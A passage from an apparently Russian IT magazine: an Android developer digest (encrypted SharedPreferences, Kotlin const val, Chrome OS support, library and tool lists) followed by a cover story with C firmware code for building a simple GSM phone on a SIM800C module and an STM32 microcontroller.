Все, теперь sharedPrefs можно использовать вмес то стандартного объекта
SharedPreferences для хранения и извлечения настроек. Все они будут
автоматически зашифрованы с помощью ключа, который не удастся узнать,
даже получив права root на устройстве.





                 Так выглядят зашифрованные настройки


Val vs. const val
To val, or to const val, that is the question — замет ка о различиях между val
и const val в Kotlin.
   Возьмем следующий пример:


val FANCY_VAL = 1
const val FANCY_CONST_VAL = 2

Обе эти переменные немодифицируемые, но вторая объ явлена с ключевым
словом const в начале. Что это зна чит на деле? Во‐первых, FANCY_VAL станет
приватной переменной, для дос тупа к которой будет соз дан геттер. Это мож‐
но увидеть, если скомпилировать код и затем декомпилировать его в Java:


public final class ConstValKt {
    private static final int FANCY_VAL = 1;
    public static final int FANCY_CONST_VAL = 2;


    public static final int getFANCY_VAL() {
        return FANCY_VAL;
    }
}

Во‐вторых, переменная FANCY_CONST_VAL будет заинлайнена, то есть ком‐
пилятор заменит все полученные зна чения этой переменной на само зна‐
чение. Это тоже можно увидеть, если написать код, использующий эти
переменные, а затем скомпилировать и декомпилировать его.
   Оригинальный код:


public static void main(String[] args) {
    System.out.println(ConstValKt.get_FANCY_VAL());
    System.out.println(ConstValKt.MY_FANCY_CONST_VAL);
}

Декомпилированный код:


public static void main(String[] var0) {
    System.out.println(ConstValKt.getFANCY_VAL());
    System.out.println(2);
}

Вывод: const val позволя ет оптимизи ровать код, избавившись от ненужных
геттеров и обращений к переменным.


Оптимизация приложе ния для Chrome OS
Optimizing Android app experiences for Chrome OS — статья разработчиков
Chrome OS о том, что нуж но сделать, чтобы Android‐при ложе ние стало удоб‐
ным для пользователей Chrome OS. Основные моменты:
 • Под держка клавиату ры. С этим все просто, Android с первых версий
   поддерживает клавиатуру. Для обра ботки нажатий клавиш дос таточно
   добавить в активность один обра ботчик:


   override fun onKeyUp(code: Int, ev: KeyEvent?): Boolean {
       return when (code) {
           KeyEvent.KEYCODE_J ‐> {
               // Обрабатываем нажатие
               true
           }
           else ‐> super.onKeyUp(code, ev)
       }
   }

   Следует иметь в виду, что ноутбуки на Chrome OS оснащены специальной
   клавишей «Обновить» (код кнопки: KEYCODE_REFRESH). В Android‐приложе‐
   ниях    эта    кнопка   по   умолчанию    запускает   обновление
   SwipeRefreshLayout.
 • Тач пад. Пользователи Chrome OS ожидают, что свайп двумя пальцами
   по тачпаду будет проматывать экран. Это поведение автоматически рас‐
   пространяется на Android‐приложения, но если необходимо обрабаты вать
   эти действия раздельно, то следует игнорировать MotionEvent с сос‐
   тоянием кнопок, равным нулю (event.getButtonState() == 0).
 • NDK.  Если  Android‐приложение  использует  нативные  библиоте ки
   для  платформы ARM, Chrome OS  будет при менять  x86‐трансля тор
   для запуска кода библиотеки. Это снижает производительность, поэтому
   разработчику сле дует включать в при ложение библиотеки для платформ
   ARM, x86 и AMD64.
 • Раз метка. Android уже давно позволяет использовать разную разметку
   и метод навигации в зависимости от ориента ции и размера экрана. Под‐
   держка разных устройств и положений экрана автоматически сделает при‐
   ложение более удоб ным в использовании на устройствах с Chrome OS.
   Также стоит сделать обработчик смены раз решения в колбэке onConfigu‐
   rationChanged  на  случай,  если  пользователь  подключит  внешний
   монитор.


        НОВЫЕ БИБЛИОТЕКИ KOTLIN


10 New Android Kotlin Libraries You Should Check Out This Winter — подборка
из десяти новых, написанных на Kotlin биб лиотек:
 1. Dots Indicator — индикатор, показывающий текущую страницу ViewPager
   (или ViewPager2).
 2. CalendarView — гибкий, кас томизируемый кален дарь.
 3. EasyFloat — библиотека для создания плавающих окон.
 4. Timeline‐View — библиотека для создания тай млайнов (событий, сле‐
   дующих друг за другом).
 5. Coil‐Kt — библиотека загрузки изоб ражений (аналог Picasso и Glide).
 6. Simple Calendar — еще один календарь.
 7. Material Drawer — дровер (выезжающая с левой стороны экрана панель)
   в стиле Material Design.
 8. What if — функция‐рас ширение для быстрой про верки условий (в том чис‐
   ле в билдерах).
 9. Koin — DI‐фреймворк, ана лог Dagger без рефлексии.
10. Arrow‐kt — библиотека функционального программирования.


             ИНСТРУМЕНТЫ


 • Ipwndfu — нашумевший экспло ит axi0mX для взлома загрузчиков iPhone;
 • Decrypt0r — скрипт для автоматичес кой загрузки и расшифровки заг‐
   рузочных образов iPhone (базиру ется на экспло ите axi0mX);
 • MOBEXLER — вир туальная машина для пентеста мобильных приложений;
 • Amtracker — инструмент для идентифика ции семейств мал вари;
 • Android‐device‐check — набор скриптов для проверки нас троек безопас‐
   ности устройства.


              БИБЛИОТЕКИ


 • SurveyKit — библиотека для создания опросов в сти ле ResearchKit для iOS;
 • AddressPicker — простая библиотека для выбора адреса с помощью
   Google Maps;
 • PinLockView — библиотека для ввода PIN‐кодов;
 • Insetter — библиотека для работы с Window Insets (обработки сос тояний
   изменения границ экрана приложения);
 • Beagle — инструмент для отладки приложения прямо на устройстве;
 • OkReplay — OkHttp‐библиотека для записи и воспроизве дения отве тов
   сервера в Unit‐тестах;
 • Formula — реактивный фреймворк для управления состоянием фраг‐
   ментов;
 • Http4k — фреймворк для создания серверных HTTP‐приложений на Kotlin
   по принципу Server as function;
 • Flipper — библиотека для включения/отключения отдельных функций при‐
   ложения в зависимости от билда или настроек;
 • Uniﬂow‐kt — библиотека data ﬂow для Kotlin;
 • SmoothBottomBar — анимированная панель навигации в нижней части
   экрана;
 • ElegantDialog — красивый диалог.
COVERSTORY





                                                                             Candidum
                                                                                             duospirit@gmail.com




                                      КАК
                              СОБРАТЬ
                             СВОЙ
                          МОБИЛЬНИК
                           И ПОЧЕМУ
                             СЕГОДНЯ
                          ЭТО ПРОЩЕ,
                                ЧЕМ
                              КАЖЕТСЯ

     БЕЗ СЛЕЖКИ
     И ЗАКЛАДОК




Что твой телефон знает о тебе? Насколько надежно он хра‐
нит информацию и кто имеет к ней доступ? К счастью, изго‐
товить  и  запрограммировать  собственный  мобильный
телефон теперь можно буквально за несколько дней. Что я
и сделал, а теперь и тебе покажу, что для этого нужно.


Все началось с того, что некоторое время назад я собирал для себя телефон
на модуле связи GSM. Современная электроника была размещена в вин‐
тажном корпусе с внешней трубкой и дисковым номеронабирате лем (пом‐
нишь ли ты еще, как ими пользовать ся?). Увы, из‐за непродуманной схе мы
звонить с него было неудобно.
   Тогда я решил пред принять вторую попытку, но уже с новой концепци ей.
Хотелось создать компактное устройство, выполняющее функции простого
кнопочного телефона и при этом пригодное к практическому использованию.
В идеале заряда даже от небольшого акку мулятора должно хватать минимум
на неделю. Никаких лишних сервисов, подозритель ных приложений и надо‐
едливых уведомлений, только самое необходимое — звонки, SMS и телефон‐
ная книжка.





  По мнению всех ведущих специалис тов с мировым име нем, тут десять
  баллов из десяти по шка ле ремонтопригодности

Проект демонстрировался на Chaos Constructions 2019 и, к моему (приятно‐
му) удивлению, вызвал интерес у широкой аудитории. Многим было любопыт‐
но узнать внутреннее устройство мобильного телефона, поэтому сегодня я
подробно расскажу, как можно собрать подобный гаджет самостоятельно.


           WARNING

                        Увы, система сотовой свя зи по умолчанию поз‐
                       воля ет операторам следить за абонентами прак‐
                        тически в режиме реального времени и с точ‐
                      ностью порядка двад цати мет ров (за счет три‐
                         ангуляции с нескольких вышек). C учетом россий‐
                       ской прак тики выдачи симок в обмен на паспор‐
                      тные  дан ные,  ситуация  выглядит  печальной.
                     На самом деле уйти из‐под над зора телеком‐
                      муникационных   компаний   тоже   возможно,
                      но такие способы выходят за рамки этой статьи.



БЛОК-СХЕМА КОМПОНЕНТОВ
Сперва определимся с требова ниями к устройству: нам нужно совершать
исходящие звонки, принимать входящие, читать и писать SMS (в том чис ле
на кириллице) и управлять контакта ми в телефонной книге. Это базовая фун‐
кциональность, которую пользователи ожидают от кнопочных телефонов.
Конечно, это далеко не полный список и тут не хва тает как минимум встро‐
енных игр (змейки или тет риса), но их легко будет добавить уже на финаль‐
ном этапе.
  Ключевым  компонентом  устройства  станет  модуль  сотовой  связи
SIM800C. Он содержит пол ный радиотракт, аудиотракт и реализует основные
функции работы с сетью GSM. Иными сло вами, это практически готовый мост
GSM‐UART, который нуждается лишь в управлении через внешний терминал.
  Для этого нам потребу ется экран, клавиатура и какой‐нибудь микрокон‐
троллер для выпол нения основной прог раммы. В качестве экрана я исполь‐
зовал дисплейный модуль ST7735 с разрешени ем 128 на 160 пикселей.
К нему у меня уже была готовая библиотека, которая позволяла отрисовывать
символы и графические примитивы. По большому счету выбор дисплея нек‐
ритичен для про екта, и ты можешь использовать любой другой с подходящей
диагональю.
   Клавиатура с шестнадцатью кнопками реализова на на сдви говых регис‐
трах (пара восьмибитных микросхем 74HC165  (PDF). Также ты можешь
использовать их отечественный аналог — микросхемы компании «Интеграл»
КР1533ИР9. В любом случае выход таких регистров представляет собой
неполноценный SPI, так как даже при отключении они не переходят в вы соко‐
импедансное состояние. Поэтому вместо аппаратной и совмещенной с дис‐
плеем шины SPI для них использовалась программная реализация.
   Управлять всем будет микроконтроллер семей ства STM32. Так как осо‐
бого быстродействия не требуется, подой дут даже бюджетные решения. Я
остановил свой выбор на F103C8T6 (PDF), его ресурсов тут дол жно хватить
с избытком. Кроме того, именно на таком микроконтрол лере выпускается
известная модельная линейка отладочных плат BluePill (прекрасное средс тво
для избавления от Arduino‐зависимости). Это поз волило собрать прототип
и протестировать работу компонентов практичес ки с самого старта.


             INFO

                    Некоторые   микросхе мы   F103C8T6   име‐
                     ют  128  Кбайт  памяти  вместо  заявленных
                      по документации 64 Кбайт. Однако это относится
                          к недокументирован ным возможностям, и рас‐
                       считывать на «лишний» банк памяти не стоит.


Позже (и в качестве приятного бонуса) я решил добавить в проект внешнюю
постоянную память W25Q32 (PDF) на 32 Мбит. Это позволило не переза‐
писывать флеш самого микроконтроллера и хра нить все контакты отдельно.
Кроме того, появилась воз можность загружать на телефон картинки, символы
и прочие элементы растровой гра фики.
  Сама схема мобильного телефо на дос таточно стандартная и в коммента‐
риях вряд ли нуждается. SIM800C включается при подаче низкого уровня
на вывод REST (используется транзистор Q1, соединенный с контактом
PA0 микроконтрол лера). Дополнитель но светоди оды VD2 и VD3 указывают
на состояние радиомодуля. VD2 мигает при успешном под ключении, тогда
как VD3 горит все время, пока SIM800C активен.





                 Принципиальная схема устрой ства

Компоненты размещены на двух односторонних печат ных платах, преиму щес‐
твенно поверхностным монтажом. Первая плата содержит радиомодуль, мик‐
роконтроллер, мик росхему внешней памяти и разъемы для подключения
антенны и динамика. Вто рая плата целиком и пол ностью отдана под клавиату‐
ру. Собранная конструкция помещается в корпус из оргстекла и закрепля ется
на стойках М3.
  Питается  наше  устройство   от  литий‐полимерного   аккумулятора
на 1500 мА ⋅ ч. Его емкость примерно в два раза ниже, чем у современных
флагманских смартфонов, но и ее хватает примерно на неделю в режиме
ожидания (потребление около 6 мА) или на сут ки активного пользования (пот‐
ребление около 40 мА).


             INFO

                    Вообще говоря, большая часть использованных
                        электронных компонен тов сейчас доступна в виде
                        готовых оценочных плат или модулей. Поэтому,
                       если тебе не хочется возиться с разводкой плат
                      и пайкой микросхем, ты можешь собрать все
                       на беспаечных макетках.



НАСТРАИВАЕМ UART
Сегодня существует мас са вариантов для программи рования микроконтрол‐
леров. Это и различные языки (С/С++, Rust), и самые разнообразные прик‐
ладные библиотеки, абс тра гирующие раз работку от аппаратного уровня (HAL
от ST Microelectronics, Arduino Core и другие). Я использовал в проекте
каноничный C и открытую libopencm3.


        WWW

                     Полный комплект исходных файлов проекта дос‐
                        тупен в репозитории на GitHub.


Первым делом сле дует инициализиро вать UART1, ведь именно он отвечает
за общение с радиомодулем. Параметры стандартные: 115 200 бод и 8N1.


static void usart1_setup(void){
    /* Enable clocks for GPIO port A (for GPIO_USART1_TX) and USART1
*/
    rcc_periph_clock_enable(RCC_GPIOA);
    rcc_periph_clock_enable(RCC_USART1);
    /* Enable the USART1 interrupt */
    nvic_enable_irq(NVIC_USART1_IRQ);
    /* PA9 TX,PA10 RX */
    gpio_set_mode(GPIOA, GPIO_MODE_OUTPUT_50_MHZ, GPIO_CNF_OUTPUT
_ALTFN_PUSHPULL, GPIO_USART1_TX);
    gpio_set_mode(GPIOA, GPIO_MODE_INPUT, GPIO_CNF_INPUT_FLOAT,
GPIO_USART1_RX);
    /* Setup UART parameters */
    usart_set_baudrate(USART1, 115200);
    usart_set_databits(USART1, 8);
    usart_set_stopbits(USART1, USART_STOPBITS_1);
    usart_set_mode(USART1, USART_MODE_TX_RX);
    usart_set_parity(USART1, USART_PARITY_NONE);
    usart_set_flow_control(USART1, USART_FLOWCONTROL_NONE);
    usart_enable_rx_interrupt(USART1);
    usart_enable(USART1);
}

После этого логично как‐то орга низовать отправку команд на модуль. Нап‐
ример, c помощью сторонней реализации printf(). Для этого используется
библиотека rprintf. Ее код хорошо опти мизи рован и занимает всего нес коль‐
ко килобайтов памяти. Биб лиотеку следует подпра вить для работы с li‐
bopencm3, буквально нес коль ко строк.


#38  #define UART USART1
...
#95  vfprintf_((&usart_send_blocking), format, arg);
...
#142 ch = usart_recv_blocking(UART);

Теперь модулю можно отправлять команды вида printf_("AT_command"),
а ответ модуля принима ется с использованием прерываний и сохраняется
в буфер. После приема содержимое ана лизи руется, и если это ожидаемый
ответ, то вызывается функция‐обработчик, которая используется для вывода
сообщений SMS и USSD. Также возможен непос редственный вывод сооб‐
щения на экран, что очень удобно при отладке.


РАБОТА С ЭКРАНОМ
Как и любую другую периферию, дисплей перед использованием предстоит
инициализировать. Конечно, сегодня подходящий код можно найти и в
интернете, но я решил написать реализацию самостоятельно. Это не отнимет
много времени, зато позволит  лучше узнать воз можнос ти микросхемы
ST7735. Я ориентировался на документацию  (PDF) производителя и брал
за основу готовые примеры в псевдокоде.


static void spi1_setup(void){
    /* Enable SPI1 Periph and gpio clocks */
    rcc_periph_clock_enable(RCC_SPI1);
    rcc_periph_clock_enable(RCC_GPIOA);
    /* Configure GPIOs:
      * SCK = PA5
      * DC = PA6
      * MOSI = PA7
      * CS = PA1
      * RST = PA4
      * LED = PB0
      */
    gpio_set_mode(GPIOA, GPIO_MODE_OUTPUT_50_MHZ, GPIO_CNF_OUTPUT
_ALTFN_PUSHPULL, GPIO5 | GPIO7);
    gpio_set_mode(GPIOA, GPIO_MODE_OUTPUT_50_MHZ, GPIO_CNF_OUTPUT
_PUSHPULL, GPIO4 | GPIO6 | GPIO1);
    /* Reset SPI, SPI_CR1 register cleared, SPI is disabled */
    spi_reset(SPI1);
    /* Set up SPI in Master mode with:
      * Clock baud rate: 1/64 of peripheral clock frequency
      * Clock polarity: Idle High
      * Clock phase: Data valid on 2nd clock pulse
      * Data frame format: 8‐bit
      * Frame format: MSB First
      */
    spi_init_master(SPI1, SPI_CR1_BAUDRATE_FPCLK_DIV_2, SPI_CR
1_CPOL_CLK_TO_0_WHEN_IDLE, SPI_CR1_CPHA_CLK_TRANSITION_1, SPI_CR
1_DFF_8BIT, SPI_CR1_MSBFIRST);
    /* Set NSS management to software */
    spi_enable_software_slave_management(SPI1);
    spi_set_nss_high(SPI1);
    /* Enable SPI1 periph. */
    spi_enable(SPI1);
    gpio_set(GPIOA, GPIO1);
}

В библиотеке последова тельно реализованы функции отрисовки  точек,
линий, окружностей, печати символов и целых строк и обновления экрана.
Также поддерживается вывод символов кириллицы в кодировке CP866. Клю‐
чевой компонент кода — вызов st7735_sendchar(char* c), который поз‐
воляет последовательно выводить на экран строки, в том числе и с управля‐
ющими последовательностями. На данный момент поддерживаются символы
перевода строки (\n), возврата каретки (\r), очис тки экрана (\a) и бэкспейса
(\b).


void st7735_sendchar(char ch){
    uint16_t px, py;


    gpio_clear(STPORT, STCS);
    if (ch == '\r') {
        pos ‐= pos % 26;
        return;
    }
    if (ch == '\n') {
        pos += 26;
        pos ‐= pos % 26;
        return;
    }
    if (ch == '\a') {
        pos = 0;
        st7735_clear(bg_color);
        return;
    }
    if (ch == '\b') {
        pos‐‐;
        px = (pos % 26) * 6;
        py = (pos / 26) * 8;
        st7735_drawchar(px, py, 0x20, txt_color, bg_color);
        return;
    }
    if(pos > 416) {
        pos=0;
        st7735_clear(bg_color);
    }
    px = (pos % 26) * 6;
    py = (pos /26) * 8;


    st7735_drawchar(px, py, ch, txt_color, bg_color);
    pos++;
    while (SPI_SR(SPI) & SPI_SR_BSY);
    gpio_set(STPORT,STCS);
}

По умолчанию исполь зуется зеленый текст на черном фоне. Цвета можно ука‐
зать явно, с помощью вызова функции st7735_set_printf_color(unit16_t
text, uint16_t back). Кроме того, реализована допол нительная функция
вывода текущего символа, который пользователь набирает на клавиатуре.


void st7735_virt_sendchar(char ch){
    uint16_t px, py;
    gpio_clear(STPORT, STCS);
    px = (pos % 26) * 6;
    py = (pos / 26) * 8;
    if (ch > 0x20)  {
        st7735_drawchar(px, py, ch, RED, bg_color);
    }
    while (SPI_SR(SPI) & SPI_SR_BSY);
    gpio_set(STPORT, STCS);
}

Она похожа на st7735_sendchar(), но не обрабатывает управляющие пос‐
ледовательности и не меня ет текущую позицию символа. Таким образом,
вызов функции st7735_sendchar() после st7735_virt_sendchar() перери‐
сует на экране символ, выведенный st7735_virt_sendchar().


КЛАВИАТУРА
Весь набор кно пок подключен через сдвиговые регистры к программному
SPI. Обрабатывает пользовательский ввод библиотека 4х4key. У клавиатуры
две раскладки — русская и английская, в каж дой раскладке за кнопкой зак‐
реплено по четыре символа.





Тут я несколько отступил от клас сики кно почных телефонов нулевых годов —
выбор конкретного символа определяется не количеством кликов, а длитель‐
ностью нажатия. Это связано с тем, что в мобильниках обычно исполь‐
зовались мембранные клавиату ры, а тактовые кноп ки тугие и перебирать бук‐
вы уже не так удоб но.
   Рассмотрим процесс обра бот ки ввода подробнее. За опрос клавиатуры
отвечает функция get_key(). Для это го использует ся процедура read_key(),
которая считывает текущее состояние сдвиговых регистров и возвращает два
байта информации от кно пок. Сочета ний клавиш в данный момент нет, но их
можно легко добавить при необходимос ти.
   Раскладка переключается при получении кода 0x0002, в любом другом
случае возвращается код символа. В зависимос ти от выб ранного язы ка зна‐
чение переменной ch_map инкрементиру ется.


...
while (!key_code) {
    key_code = read_key();
}
do {
    if(key_code == 0x0002) {
        if (ch_map < 2) {
            ch_map++;
        else {
            ch_map = 0;
        }
        show_char_map(ch_map);
        while(key_code==2) key_code=read_key();
    }
    while(!key_code) {
        key_code = read_key();
    }
} while (key_code == 0x0002);
...

Теперь вызывается функция key_map(), которая принимает на вход код кла‐
виши и номер текущей раскладки. Она ищет нужный символ в мас сиве
char_map и возвращает результат. Логика дальнейшей обработки ввода
зависит от полученного символа.


...
if (key == '\n') {
    delay(500);
} else if (key == '\b') {
    delay(500);
} else if(key == ' ') {
#ifdef ECHO
    st7735_virt_sendchar(key);
#endif
    delay(800);
    timer_start();
    old_keycode = key_code;
    do {
        key_code = read_key();
        if (key_code){
            if (key_code == old_keycode) {
                count++;
                if (count > 15) {
                    count = 0;
                }
                wait_key_counter = 0;
            } else {
                count = 0;
                break;
            }
            key = keymap2(count, 2);
#ifdef ECHO
            systick_interrupt_disable();
            st7735_virt_sendchar(key);
            systick_interrupt_enable();
#endif
            delay(900);
    }
} while (wait_key_counter < 1000);
timer_stop();
...

Обработчик клавиатуры вышел сложнее, чем мне бы хотелось, но зато я
получил практически все необ ходимые символы на шес тнадцати клавишах,
что довольно удоб но. Однако в некоторых слу чаях хотелось бы мгновенной
реакции на нажатие кнопок: например, когда вызываются пункты меню
или принимается входящий вызов. Для этих целей реализована отдельная
функция fast_get_key(), которая работает с усеченным массивом сим‐
волов.


char fast_get_key() {
    uint16_t key_code;


    char key;
    while (!key_code) {
        key_code=read_key();
    }
    key = keymap(key_code, 0);
    while (read_key()) {
         __asm__("nop");
    }
#ifdef ECHO
    echo(key);
#endif
    return key;
}

Теперь, когда есть дисплей и клавиату ра, от создания терминала нас отде‐
ляют только функции stprintf() и kscanf(). Они были реализованы
с помощью уже упоминавшейся библиотеки rprintf, но изменений тут пот‐
ребовалось чуть больше.


int stprintf(const char \*format, …) {
    va_list arg;
    va_start(arg, format);
    stprintf_((&st7735_sendchar), format, arg);
    va_end(arg);
    return 0;
}




                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ

        БЕЗ СЛЕЖКИ
        И ЗАКЛАДОК
           КАК СОБРАТЬ СВОЙ МОБИЛЬНИК И ПОЧЕМУ
               СЕГОДНЯ ЭТО ПРОЩЕ, ЧЕМ КАЖЕТСЯ




С функцией kscanf() все несколько сложнее, так как у нас есть две функции
получения символа с кла виатуры. Поэто му придется объеди нить их в одну,
организовав переключение ввода меж ду get_key() и fast_get_key().
Заодно добавим поддержку управляющего символа \b.


void set_scanf_mode(unsigned char mode) {
    fast_mode=mode;
}


int kscanf(const char* format, …) {
    va_list args;
    va_start( args, format );


    int count = 0;
    char ch = 0;
    char buffer[kscanf_buff_size];
    kscanf_buffer = buffer;


    while (count <= kscanf_buff_size ) {
        if(fast_mode) {
            ch = fast_get_key();
        } else {
            ch = get_key();
        }
        if (ch == '\b') {
            if (kscanf_buffer > buffer) {
                kscanf_buffer‐‐;
            }
            continue;
        } else {
            count++;
        }
        if (ch != '\n' && ch != '\r') {
            *kscanf_buffer++ = ch;
        else {
            break;
        }
    }


    *kscanf_buffer = '\0';
    kscanf_buffer = buffer;
    count =  ksscanf(kscanf_buffer, format, args);
    va_end(args);
    return count;
}

Таким образом мы реализова ли систему вво да‐вывода и теперь имеем прак‐
тически полнофункциональный терминал. Нап ример, чтобы очис тить экран
и вывести традиционное приветствие, дос таточно написать строчку


stprintf("\aHello World!");


МОДУЛЬ GSM
Рассмотрим работу с SIM800 на примере с отправкой SMS, остальные фун‐
кции ведут себя аналогично. Будем использовать текстовый режим, так как он
более наглядный. Дополнитель но для отправки сообщений на кириллице
нужно заранее настроить кодировку.


void sim800_init_cmd() {
    printf_("AT+CMGF=1\r\n");
    for (uint32_t i = 0; i < 0xFFFFFF; i++) __asm__("nop");
    printf_("AT+CSCS=\"UCS2\"\r\n");
    for (uint32_t i = 0; i < 0xFFFFFF; i++) __asm__("nop");
    printf_("AT+CSMP=17,167,0,8\r\n");
    for (uint32_t i = 0; i < 0xFFFFFF; i++) __asm__("nop");
}


void fast_sms_send(char *text, char *tel) {
    char *p_tel;
    char u_tel[64]="+7";
    char temp[512];


    if (tel[0] == '8') {
        p_tel = tel + 1;
    } else if (tel[0] == '+') {
        p_tel = tel + 2;
    } else {
        p_tel = tel;
    }


    strcat(u_tel, p_tel);
    strcpy(temp, text);
    cp866_to_utc2(temp);
    cp866_to_utc2(u_tel);
    stprintf("\aSend sms\r\nAT+CMGS=\"%s\"\r\n%s\x1A", u_tel, temp);
    printf_("AT+CMGS=\"%s\"\r\n", u_tel);


    for (uint32_t i = 0; i < 0xFFFFFF; i++) __asm__("nop");
    printf_("%s\x1A", temp);
}

Теперь можно исполь зовать в коде что‐то осмысленное и понятное, нап‐
ример


fast_sms_send("Hello world!", "89162402484");

Попробуем передать строку на кириллице, предварительно включив нужную
кодировку:


void write_sms() {
    char text[256];
    char tel[13];
    uint8_t ret_code;


    stprintf("\aSMS writer v0.01\r\n"
                    "Enter the sms text\r\n"
                    ">");
    kscanf("%s", text);
    ret_code = telbook_get_number(tel);
    if(!ret_code) {
        return;
    }
    fast_sms_send(text, tel);
}

К слову, здесь в качестве номера контакта исполь зуется запись из телефон‐
ной книги. Думаю, о ней стоит расска зать чуть подробнее.


ТЕЛЕФОННАЯ КНИГА
Как я уже говорил, информа ция о контактах хра нится в микросхеме внешней
памяти. Каждая запись занимает 32 байта: шес тнадцать на номер телефона
и столько же на имя або нента. Сейчас эти данные у меня записываются
открытым текстом, без шифрования. Конечно, желательно использовать
здесь AES или любой другой блочный шифр.


             INFO

                   Помни, что реализация в устройстве даже про‐
                       веренных алгоритмов может содержать в себе
                         уязвимости и привести к утечке важной информа‐
                        ции. Подробнее об атаках по сто ронним каналам
                      и способе противодействия им читай в статье
                            «Аппаратный  CTF. Легкий способ узнать ключ
                  шифрования, когда у тебя под рукой осциллограф
                      и ноутбук».


Основные возможности телефонной книги поз воляют выбрать нужный номер
контакта (telbook_get_number()), а также добавить или удалить уже сущес‐
твующий  (telbook_rec_add() и telbook_rec_del()). Кроме того, можно
произвести поиск имени по телефону с помощью функции telbook_find_‐
name(). Для  низкоуровневого  взаимодей ствия  с  микросхемой  памяти
написана библиотека 25q32, которая берет на себя все нюансы аппаратной
реализации.


РАБОТА С ГРАФИКОЙ
Что можно еще попробовать, рас полагая цвет ным дисплеем и несколькими
мегабайтами свободной памяти? Ну конечно  же, вывод изображений,
это само просится! Мобилка легко переваривает файлы ВМР с разрешени‐
ем 128 на 160 и глубиной цвета в 16 бит. Картинки хранятся во внешней мик‐
росхеме и отображаются на экран с помощью функции img_from_flash(),
которая принимает адрес начала мас сива пикселей. Структура формата
очень простая, но, если ты ее забыл, всег да можно почитать про заголовок
и смещение в интернете.





Изображение на экран выводится частями с исполь зованием буфера на сте‐
ке. В каждом проходе 4096 байт считыва ются из памяти в буфер, а потом
пересылаются на экран. Конечно, мож но заметить, что у F103C8T6 есть кон‐
троллер DMA, который предназна чен именно для таких задач. Но, так как у
нас нет возможности статически раз местить весь буфер кад ра в памяти,
выигрыш от использования DMA здесь будет минимальным.


void img_from_flash_v3(uint32_t addr) {
    uint8_t bufer[4096];
    gpio_clear(STPORT, STCS);
    st7735_sendcmd(ST7735_MADCTL);
    st7735_senddata(1 << 7);
    while (SPI_SR(SPI) & SPI_SR_BSY);
    gpio_set(GPIOA, STCS);


    for(uint8_t i = 0; i < 10; i++) {
        w25_read(addr + (i * 4096), bufer, 4096);
        st7735_drawimg(0,0+16*i,128,16, bufer);
    }


    gpio_clear(STPORT, STCS);
    st7735_sendcmd(ST7735_MADCTL);
    st7735_senddata(MV | MX);
    while (SPI_SR(SPI) & SPI_SR_BSY);
    gpio_set(STPORT, STCS);
}

Разумеется, перед тем как обращаться к изоб ражениям в памяти, пред‐
варительно их следует туда все же записать. Для этого используется
UART2 и протокол xmodem. На принимающей стороне я обрабатываю данные
функцией xmodem_to_flash(), которой переда ется адрес начала файла
во флеше.


void xmodem_to_flash(uint32_t addr) {
    unsigned char buf[132];
    uint32_t byte = 0;
    uint8_t lastlen, ch;


    usart2_init();
    usart_send_blocking(USARTX, NAK);
    while(1){
        ch = usart_recv_blocking(USARTX);
        if (ch == SOH){
            for (uint8_t i = 0; i < 131; i++) {
                ch = usart_recv_blocking(USARTX);
                buf[i]=ch;
            }
            lastlen=129;
            while(buf[lastlen‐‐] == EOF);
            lastlen ‐= 1;
            w25_write(addr + byte, buf + 2, lastlen);
            byte += lastlen;
            usart_send_blocking(USARTX,ACK);
            continue;
        }
        if (ch == EOT){
            usart_send_blocking(USARTX, ACK);
            break;
        }
    }
    usart2_deinit();
}

Таким образом, для записи файла с компьютера я начинаю передачу
с помощью терминальной программы (например, minicom), после чего
любым удобным способом вызываю функцию xmodem_to_flash().


ЭНЕРГОСБЕРЕЖЕНИЕ
Малое время автономной работы — слабое мес то современных смартфонов,
в том числе даже флагманских аппа ратов. В своем проекте я использовал
несколько способов сок ращения энергопотребления.
  В первую  очередь посадим на  сухой  паек радиомодуль. Команда
AT+CSCLK=1 и высокий уро вень на выводе DTR переводят SIM800C в спя щий
режим (sim800_sleep()). При этом все еще сох раня ется воз можность при‐
нимать входящие вызовы и SMS, но для передачи команд с микроконтрол‐
лера нужно вновь подать низкий уровень на DTR и выждать порядка 50 мс
(sim800_wake()). В таком режиме потребление сос тавляет всего нес колько
миллиамперов.
  Подсветка дисплея тоже потребля ет немало, так что на время ожи дания
логично отключать и ее (функции st7735_sleep() и st7735_wake()). Однако
основной выигрыш электроэнергии получа ется за счет перевода микрокон‐
троллера в режим глубокого сна, это поз воля ет сэкономить допол нитель‐
ные 30 мА.


void standby (void) {
    SCB_SCR |= SCB_SCR_SLEEPDEEP;
    PWR_CR |= PWR_CR_PDDS;
    PWR_CR |= PWR_CR_CWUF;


__asm__("WFI");
}

Заключительная строч ка кода (Wait For Interrupt) переводит F103C8T6 в режим
ожидания, из которого он выходит, только когда наступает прерывание.
В нашем случае это подача низкого уровня на вывод REST микроконтрол‐
лера.


ИНТЕРФЕЙС
Интерфейс  устрой ства  текстовый  и  реализован  достаточно  просто.
При вызове соответствующего меню очищается экран и появляется подсказ‐
ка с функциями клавиш. После это го ожидается пользовательский ввод,
и цикл повторяется. Все функции меню соб раны в отдельном файле menu.c.


void main_help_menu(void) {
    stprintf("\aHELP\r\n"
                        "~ ‐ ATA\r\n"
                        "! ‐ ATH\r\n"
                        "1 ‐ data menu\r\n"
                        "2 ‐ call menu \r\n"
                        "3 ‐ img menu\r\n"
                        "4 ‐ power menu\r\n"
                        "5 ‐ sim800 menu\r\n"
                        "6 ‐ help\r\n"
                        "7 ‐ sim800 PWR\r\n"
                        "8 ‐ sleep\r\n"
                        "9 ‐ sleep logo\r\n"
                        "* ‐ tel book\r\n"
                        "0 ‐ sms menu");
}


void get_keybord_cmd(void) {
    char bufer[64];
    uint32_t addr,  l, n = 4096;
    char key;
    key=fast_get_key();


    switch (key){
        case '1': data_menu(); break;
        case '2': telbook_menu_v2(); break;
        case '3': img_menu(); break;
        case '4': power_menu(); break;
        case '5': sim800_menu(); break;
        case '6': main_help_menu(); break;
        case '7': sim800_power(); break;
        case '8': st7735_sleep();
                        w25_powerdown();
                        standby();
                        break;
        case '9': w25_powerdown();
                        standby();
                        break;
        case '0': sms_menu(); break;
        case '*': telbook_menu(); break;
        case '~': sim800_take_call(); break;
        case '!': sim800_ath(); break;
    }
    return;
}

Кратко расскажу о некоторых функциях главного меню. Команда ATA поз воля‐
ет принять входящий вызов, команда ATH отклоняет вызов или завершает
звонок. Меню data облегча ет работу с внеш ней памятью и дает воз можность
в реальном вре мени посмотреть дамп любого участка, как в ASCII, так и в
